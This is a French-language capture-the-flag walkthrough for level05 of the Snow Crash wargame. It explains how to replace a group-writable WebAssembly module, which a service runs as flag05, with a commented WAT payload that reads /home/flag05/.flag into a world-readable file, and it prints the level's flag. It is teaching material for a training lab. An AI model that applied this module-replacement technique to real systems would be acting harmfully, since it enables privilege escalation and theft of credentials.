# Level05 — Exploiter un module WebAssembly modifiable

**Point de départ :** une session sur la VM Snow Crash sous `level05`. Le flag de ce niveau sert de mot de passe au compte `level06`.

## Objectif

Nous sommes connectés à la machine Linux avec l’utilisateur `level05`. Notre objectif est de récupérer le flag (le mot de passe permettant de passer au niveau suivant), situé dans `/home/flag05/.flag`.

Le problème est que `level05` n’a pas le droit de lire ce fichier, contrairement à `flag05`. Nous devons donc trouver un moyen de faire lire le fichier par un programme qui possède les droits nécessaires.

La méthode repose sur un module WebAssembly modifiable par `level05` et exécuté par un autre utilisateur. Ces conditions restent à vérifier.

Chaîne de fonctionnement à confirmer :

```text
level05 modifie un module WASM
          │
          ▼
le service l’exécute comme flag05
          │
          ▼
WASI lui donne accès à /
          │
          ▼
le module lit le flag et l’écrit dans un fichier lisible
```

## 1. Identifier son environnement

```bash
whoami
id
ls -la
```

Ces commandes permettent de savoir avec quel utilisateur nous sommes connectés et quels fichiers nous avons à notre disposition.

- `whoami` affiche le nom de l’utilisateur connecté.
- `id` affiche son identité et les groupes auxquels il appartient. Sous Linux, un groupe permet de partager des droits entre plusieurs utilisateurs.
- `ls -la` affiche les fichiers du dossier courant, y compris les fichiers cachés, ainsi que leurs permissions.

La recherche utilise le nom du compte `level05`. L’accessibilité du README reste à vérifier.

## 2. Trouver les fichiers du niveau

Rechercher les fichiers du niveau :

```bash
find / -iname '*level05*' 2>/dev/null
```

`find /` recherche à partir de la racine du système, `-iname '*level05*'` recherche les noms contenant `level05` et `2>/dev/null` masque les messages d’erreur, notamment ceux liés aux permissions.

Une piste à vérifier parmi les résultats est le dossier `/opt/snowcrash/level05`. Examiner son contenu :

```bash
ls -la /opt/snowcrash/level05
```

Si la liste contient `metaverse.wasm`, identifier sa nature :

```bash
file /opt/snowcrash/level05/metaverse.wasm
```

La commande `file` permet de connaître le type d’un fichier, indépendamment de son nom.

Le type attendu est WebAssembly. Wasmtime est un moteur capable d’exécuter ce format. Confirmer les chemins et le type avec les commandes précédentes.

## 3. Vérifier que le module est modifiable

```bash
id
ls -l /opt/snowcrash/level05/metaverse.wasm
```

Ces deux commandes doivent être lues ensemble :

- `id` liste les groupes de `level05` ;
- `ls -l` donne le propriétaire, le groupe et les droits du module.

Les permissions Linux indiquent qui peut lire (`r`), modifier (`w`) ou exécuter (`x`) un fichier. Ici, c’est surtout le droit `w` qui nous intéresse : il permet de modifier le contenu du module.

Vérifier que `level05` appartient au groupe `metaverse` et que les droits de `metaverse.wasm` autorisent sa modification par ce groupe.

Le droit de modification ne suffit pas : vérifier également l’identité qui exécute le module et les fichiers auxquels il a accès.

## 4. Trouver le service qui exécute le module

Un service est un programme, ou une tâche, géré par le système. Il peut être lancé automatiquement, sans que nous ayons à le démarrer nous-mêmes.

Le nom `metaverse.wasm` donne le mot-clé de recherche du service :

```bash
systemctl list-unit-files --all | grep -i metaverse
```

`systemctl list-unit-files --all` liste les fichiers de configuration des unités systemd ; `grep -i metaverse` ne conserve que les lignes contenant `metaverse`, sans distinguer les majuscules et les minuscules.

Unité à rechercher : `metaverse.service`. Lire sa définition :

```bash
systemctl cat metaverse.service
```

Dans cette sortie, chercher les informations suivantes :

- `User=` : vérifier si le service s’exécute sous `flag05`.
- `ExecStart=` : quelle commande est lancée ? Examiner aussi tout script qu’elle pourrait appeler avant de conclure quel module et quelles options sont utilisés.

Vérifier que Wasmtime exécute `metaverse.wasm` avec la racine `/` préouverte, notamment si la commande contient `--dir=/`. L’accès reste soumis aux autorisations WASI et aux permissions Linux. La configuration exacte du service et de tout script appelé reste à relever.

Si le service est exécuté par un timer, le repérer pour savoir quand le module sera relancé :

```bash
systemctl list-timers --all | grep -i metaverse
```

La méthode suppose la chaîne suivante :

```text
level05 peut remplacer metaverse.wasm
                 │
                 ▼
metaverse.service le lance sous flag05
                 │
                 ▼
Wasmtime préouvre /
                 │
                 ▼
le module peut demander l’ouverture de home/flag05/.flag
```

Si ces conditions sont réunies, le module modifiable est exécuté avec les droits d’un autre compte : il s’agit d’une élévation de privilèges.

## 5. Les termes utiles : WASM, WAT et WASI

| Terme | À retenir pour ce niveau |
| --- | --- |
| WASM | Le format binaire exécuté par le service : `metaverse.wasm`. |
| WAT | La version textuelle et lisible d’un module WebAssembly. C’est le format dans lequel nous écrivons le payload. |
| `wat2wasm` | L’outil qui convertit le fichier WAT en fichier WASM. |
| WASI | L’interface par laquelle un module WASM peut demander des opérations telles que l’ouverture ou la lecture d’un fichier. |
| Wasmtime | Le programme qui exécute le module et applique les autorisations WASI définies par le service. |

Un module WASM n’a pas accès aux fichiers par défaut. WASI lui permet de demander certaines opérations au système, mais seulement dans les limites autorisées par Wasmtime et les permissions Linux.

La méthode suppose que Wasmtime préouvre `/` et s’exécute sous `flag05`. Même dans ce cas, le module reste soumis aux autorisations WASI et Linux.

Nous avons donc trois éléments à réunir : un module modifiable par `level05`, un service qui l’exécute sous `flag05`, et un accès WASI au chemin du flag.

## 6. Comprendre le but du payload avant son code

Un **payload** est le programme que nous choisissons de faire exécuter pour obtenir le résultat recherché. Ici, `level05` ne peut pas lire directement le flag. La solution consiste à remplacer le module utilisé par le service par notre propre module : lors du prochain lancement, ses instructions seront exécutées avec les droits du service.

Le programme WAT effectue quatre opérations :

```text
1. ouvrir home/flag05/.flag
2. lire le flag dans la mémoire du module
3. ouvrir opt/snowcrash/level05/x
4. recopier le flag dans x
```

Les chemins sont relatifs à `/` si ce répertoire est bien préouvert par Wasmtime. C’est pourquoi ils ne commencent pas par une barre oblique dans le WAT :

```text
home/flag05/.flag          → /home/flag05/.flag
opt/snowcrash/level05/x    → /opt/snowcrash/level05/x
```

Les appels WASI utilisent des adresses dans la mémoire du module pour les chemins, les tampons et les longueurs.

## 7. Lire le payload par étapes

Le payload utilise principalement trois fonctions :

| Fonction | Rôle |
| --- | --- |
| `path_open` | Ouvrir un fichier. |
| `fd_read` | Lire son contenu. |
| `fd_write` | Écrire un contenu dans un fichier. |

Le programme range dans ces cases les chemins des fichiers, les informations nécessaires à la lecture et le contenu lu. Un tampon est simplement une zone de mémoire utilisée pour conserver temporairement des données.

Le code WAT complet est reproduit ci-dessous. Les explications après `;;` sont des commentaires : elles ne changent pas le comportement du programme.

Pour le lire, il faut connaître trois choses :

- WebAssembly utilise une **pile de valeurs** : `i32.const 64` place le nombre `64` sur la pile ; une instruction ou une fonction le récupère ensuite. `i32` et `i64` désignent des entiers de 32 et 64 bits.
- Un **descripteur** est un numéro que le programme utilise pour désigner un fichier ouvert. Une **adresse** est un emplacement dans la mémoire du module : ce sont deux choses différentes, même si elles sont représentées par des nombres.
- `i32.store` prend une adresse puis une valeur sur la pile et écrit la valeur à cette adresse ; `i32.load` lit la valeur enregistrée à l’adresse placée sur la pile.

```wat
(module  ;; Début du module WebAssembly.

  ;; Demander à WASI la fonction qui ouvre un fichier.
  (import "wasi_snapshot_preview1" "path_open"
    ;; Neuf arguments : emplacement du chemin, droits demandés, etc.
    ;; Le résultat i32 est un code d’erreur : 0 signifie succès.
    (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))

  ;; Demander la fonction qui lit un fichier dans la mémoire du module.
  (import "wasi_snapshot_preview1" "fd_read"
    (func $fd_read (param i32 i32 i32 i32) (result i32)))

  ;; Demander la fonction qui écrit la mémoire du module dans un fichier.
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)  ;; Réserver et exposer une page de 65 536 octets.
  (data (i32.const 0) "home/flag05/.flag")  ;; Placer le chemin source à l’adresse 0.
  (data (i32.const 32) "opt/snowcrash/level05/x")  ;; Chemin de sortie à l’adresse 32.

  (func (export "_start")  ;; Point d’entrée : le runtime commence ici.

    ;; 1. Ouvrir le flag en lecture avec path_open.
    ;; Les neuf valeurs sont placées sur la pile dans l’ordre des arguments.
    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
    i32.const 0   ;; Options de résolution du chemin : aucune.
    i32.const 0   ;; Adresse du chemin source dans la mémoire.
    i32.const 17  ;; Longueur du chemin source en octets.
    i32.const 0   ;; Options d’ouverture : ne pas créer ni tronquer.
    i64.const 2   ;; Droit WASI demandé : lecture du fichier.
    i64.const 0   ;; Droits héritables demandés : aucun.
    i32.const 0   ;; Options du descripteur : aucune.
    i32.const 80  ;; Adresse où WASI enregistrera le descripteur obtenu.
    call $path_open  ;; Appeler WASI avec ces neuf arguments.
    drop             ;; Retirer le code d’erreur sans le vérifier.

    ;; 2. Préparer l’iovec : une description du tampon de lecture.
    i32.const 64   ;; Adresse où enregistrer le début du tampon.
    i32.const 128  ;; Le tampon lui-même commence à l’adresse 128.
    i32.store      ;; Écrire 128 à l’adresse 64.

    i32.const 68  ;; Adresse où enregistrer la taille du tampon.
    i32.const 64  ;; Le tampon peut recevoir au maximum 64 octets.
    i32.store     ;; Écrire la taille 64 à l’adresse 68.

    i32.const 72  ;; Adresse réservée au nombre d’octets lus.
    i32.const 0   ;; Valeur initiale : zéro.
    i32.store     ;; Écrire 0 à l’adresse 72.

    ;; 3. Lire le flag dans le tampon.
    i32.const 80  ;; Adresse qui contient le descripteur du fichier source.
    i32.load      ;; Charger ce descripteur pour le passer à fd_read.
    i32.const 64  ;; Adresse de l’iovec : il décrit le tampon.
    i32.const 1   ;; Nombre d’iovecs fournis : un seul.
    i32.const 72  ;; Adresse où WASI écrira le nombre d’octets lus.
    call $fd_read ;; Lire depuis le fichier source vers le tampon.
    drop          ;; Retirer le code d’erreur sans le vérifier.

    ;; 4. Ouvrir le fichier de sortie avec path_open.
    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
    i32.const 0   ;; Options de résolution du chemin : aucune.
    i32.const 32  ;; Adresse du chemin de sortie dans la mémoire.
    i32.const 23  ;; Longueur du chemin de sortie en octets.
    i32.const 9   ;; Options WASI : créer si absent et tronquer si présent.
    i64.const 64  ;; Droit WASI demandé : écriture dans le fichier.
    i64.const 0   ;; Droits héritables demandés : aucun.
    i32.const 0   ;; Options du descripteur : aucune.
    i32.const 84  ;; Adresse où WASI enregistrera le descripteur de sortie.
    call $path_open  ;; Ouvrir le fichier de sortie.
    drop             ;; Retirer le code d’erreur sans le vérifier.

    ;; 5. Adapter la taille à la quantité réellement lue.
    i32.const 68  ;; Adresse où se trouve la taille de l’iovec.
    i32.const 72  ;; Adresse qui contient le nombre d’octets lus.
    i32.load      ;; Charger ce nombre.
    i32.store     ;; Le copier à l’adresse 68 à la place de 64.

    ;; 6. Écrire le contenu du tampon dans le fichier de sortie.
    i32.const 84   ;; Adresse qui contient le descripteur de sortie.
    i32.load       ;; Charger ce descripteur pour le passer à fd_write.
    i32.const 64   ;; Adresse de l’iovec : tampon et nouvelle taille.
    i32.const 1    ;; Nombre d’iovecs fournis : un seul.
    i32.const 76   ;; Adresse où WASI écrira le nombre d’octets écrits.
    call $fd_write ;; Écrire le contenu du tampon dans le fichier de sortie.
    drop           ;; Retirer le code d’erreur sans le vérifier.
  )  ;; Fin de la fonction _start.
)    ;; Fin du module.
```

Après une lecture réussie, le flag se trouve dans la mémoire à partir de l’adresse `128`. Sa longueur est enregistrée à l’adresse `72` puis copiée à l’adresse `68`, pour demander à `fd_write` de n’écrire que les octets effectivement lus.

Ce payload suppose que le descripteur `3` correspond à la racine préouverte. Il lit au maximum 64 octets, ignore les codes d’erreur et ne vérifie pas si l’écriture a été complète. La configuration du service reste à vérifier sur la VM.

## 8. Compiler et installer le module

Depuis `level05`, créer `/tmp/payload.wat` et y copier le bloc WAT complet de la section précédente.

```bash
vi /tmp/payload.wat
```

Nous avons besoin d’un fichier de sortie dans lequel le service pourra écrire et que `level05` pourra ensuite lire. Le créer avant le passage du service permet de préparer ses permissions :

```bash
touch /opt/snowcrash/level05/x
chmod 666 /opt/snowcrash/level05/x
```

`touch` crée le fichier `x` s’il n’existe pas. `chmod 666` donne les droits de lecture et d’écriture au propriétaire, au groupe et aux autres utilisateurs.

Compiler ensuite le WAT en WASM :

```bash
wat2wasm /tmp/payload.wat -o /tmp/payload.wasm
```

Le fichier WAT est lisible par un humain. `wat2wasm` le convertit au format binaire WASM que Wasmtime peut exécuter.

Puis remplacer le module traité par le service :

```bash
cat /tmp/payload.wasm > /opt/snowcrash/level05/metaverse.wasm
```

Cette commande remplace le contenu du module sans l’exécuter. Le déclenchement du service reste à confirmer.

## 9. Attendre le service puis lire le résultat

Après avoir confirmé le déclenchement du service et son identité, lire le fichier de sortie :

```bash
cat /opt/snowcrash/level05/x
```

Flag de référence à comparer au fichier de sortie :

```text
viuaaale9huek52boumoomioc
```

## Passer au niveau suivant

Après avoir confirmé le flag sur la VM, essayer `su - level06` avec cette valeur comme mot de passe, puis contrôler le compte courant avec `id -un`. Résultat attendu : `level06`. Cette connexion reste à valider.

## Validation sur la VM

Les valeurs et extraits de terminal ci-dessus proviennent de la solution fournie ; ils ne constituent pas une nouvelle preuve d’exécution. Les vérifications suivantes restent à effectuer :

- [ ] Confirmer l’accessibilité du README, les chemins, le type et les permissions du module.
- [ ] Relever `User`, `ExecStart`, les scripts appelés, les options WASI, le répertoire préouvert et le descripteur utilisé.
- [ ] Identifier le déclenchement du service ; vérifier la disponibilité de `wat2wasm` et les droits du fichier de sortie.
- [ ] Confirmer que le module produit le flag de référence et que le passage à `level06` fonctionne.
